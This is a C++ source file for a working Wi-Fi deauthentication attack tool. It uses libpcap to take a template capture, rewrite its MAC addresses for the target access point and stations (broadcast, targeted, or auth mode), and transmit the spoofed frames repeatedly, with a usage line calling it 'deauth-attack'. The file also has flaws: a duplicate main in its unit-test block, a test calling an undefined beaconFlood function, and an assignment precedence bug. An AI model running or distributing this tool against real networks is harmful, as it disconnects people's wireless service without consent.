#include "pch.h"
#include <gtest/gtest.h>
#include <time.h>
#include <cstring>
#include <unistd.h>
#include <fstream>
#include <vector>

void printHex(const unsigned char* str, size_t len) {
    for (size_t i = 0; i < len; ++i) {
        printf("%02x ", str[i]);
        if ((i + 1) % 16 == 0)
            printf("\n");
    }
    printf("\n");
}

#pragma pack(push, 1)
struct deauth_80211{
    uint16_t frame_control;
    uint16_t duration;
    uint8_t receiver_mac[6];
    uint8_t transmitter_mac[6];
    uint8_t bss_id[6];
    uint16_t sequence;
};

void copyMac(unsigned char *des, std::string mac) {
    int values[6];
    std::sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]);
    for(int i = 0; i < 6; ++i)
        des[i] = (unsigned char) values[i];
}

unsigned char* convertMAC(std::string mac) {
    static unsigned char macAddress[6];
    int values[6];

    std::sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5]);

    for(int i = 0; i < 6; ++i)
        macAddress[i] = (unsigned char) values[i];

    return macAddress;
}
#pragma pack(pop)

void deauthAttack(std::string interface_name,std::string ap_mac,std::string station_mac, int mode){
    char errbuf[PCAP_ERRBUF_SIZE] = {0, };
    pcap_t* pcap_descripter = nullptr;
    pcap_t* send_pcap_descripter = nullptr;
    if(mode == 2){
        pcap_descripter = pcap_open_offline("deauth-options-acauth-2.pcapng", errbuf);
    }else{
        pcap_descripter = pcap_open_offline("deauth-options-a.pcapng", errbuf);
    }
    
    send_pcap_descripter = pcap_open_live(interface_name.c_str(), BUFSIZ, 0, 0, errbuf);
    if(!pcap_descripter || !send_pcap_descripter){
        puts("pcap_open_live Error");
        HANDLE_ERROR_RETURN("deauthAttack", errbuf);
    }

    struct Packet{
        size_t _size;
        unsigned char * _start = nullptr;
        Packet(){
            #ifdef DEBUG
            std::cout<<"객체생성"<<std::endl;
            #endif
        };
        unsigned char * getAddress(int index){
            return _start + index;
        }
        ~Packet(){
            #ifdef DEBUG
            std::cout<<"소멸자생성"<<std::endl;
            #endif
            free(_start);
        }
        
    };

    const unsigned char* packet;
    struct pcap_pkthdr* packet_info;
    int res;
    if(res = pcap_next_ex(pcap_descripter, &packet_info, &packet) < 0){
        puts("잘못된 소스파일입니다.\n");
        exit(1);
    }

    std::vector<struct Packet *> modified_packets;

    uint16_t radiotap_header_len = (uint16_t) *(packet+2);
    int index_receiver_mac = radiotap_header_len + 4;
    int index_transmitter_mac = index_receiver_mac + 6;
    int index_bss_id = index_transmitter_mac + 6;
    struct Packet* des = new struct Packet();
    des->_size = packet_info->caplen;
    des->_start = (unsigned char *)malloc(des->_size);
    memcpy((unsigned char *)des->_start, (unsigned char *)packet, des->_size);
    for(int i = 3; i<radiotap_header_len; i++)
        des->_start[i] = 0x00;
    if(mode == 0){
        copyMac(des->getAddress(index_receiver_mac), std::string("ff:ff:ff:ff:ff:ff"));
    }else if(mode == 1 || mode == 2){
        copyMac(des->getAddress(index_receiver_mac), station_mac);
    }
    copyMac(des->getAddress(index_transmitter_mac), ap_mac);
    copyMac(des->getAddress(index_bss_id), ap_mac);
    
    modified_packets.push_back(des);

    if(mode == 1){
        struct Packet* des = new struct Packet();
        des->_size = packet_info->caplen;
        des->_start = (unsigned char *)malloc(des->_size);
        memcpy((unsigned char *)des->_start, (unsigned char *)packet, des->_size);
        for(int i = 3; i<radiotap_header_len; i++)
            des->_start[i] = 0x00;
        copyMac(des->getAddress(index_receiver_mac), ap_mac);
        copyMac(des->getAddress(index_transmitter_mac), station_mac);
        copyMac(des->getAddress(index_bss_id), ap_mac);
        modified_packets.push_back(des);
    }
    
    //send packet
    for(int i = 0; i<10; i++){
        for(struct Packet *modified_packet : modified_packets){
            if(pcap_sendpacket(send_pcap_descripter, modified_packet->_start, modified_packet->_size) == -1){
                HANDLE_ERROR_RETURN("attack", errbuf);
            }
            #ifdef DEBUG
            printHex(modified_packet->_start, modified_packet->_size);
            std::cout<<i<<"패킷을 보냅니다"<<std::endl;
            #endif
            usleep((int)(100000/modified_packets.size()));
        }
    }
    std::cout<<"Wifi attack Success!"<<std::endl;
    modified_packets.clear();
    pcap_close(pcap_descripter);
    pcap_close(send_pcap_descripter);
}

int main(int argc, char* argv[]){
    if(argc < 3 || argc>5 ){
        printf("Usage: deauth-attack <interface> <ap mac> [<station mac> [-auth]]");
        exit(1);
    }
    std::string interface_name(argv[1]);
    std::string ap_mac(argv[2]);
    std::string station_mac;
    int mode = 0;
    if(argc == 4){
        station_mac = std::string(argv[3]);
        mode = 1;
    }
    else if(argc == 5){
        if(std::string(argv[4]) == "-auth"){
            mode = 2;
        }
    }
    deauthAttack(interface_name, ap_mac, station_mac, mode);
    return 0;
}

#ifdef UNIT_TEST
TEST(BeaconFloodTest, HandlesValidInput) {
    beaconFlood(std::string("wlan0"), std::string("80211packet_iptimeN150UA2.pcapng"));
}

int main(int argc, char **argv) {
    ::testing::InitGoogleTest(&argc, argv);
    return RUN_ALL_TESTS();
}
#endif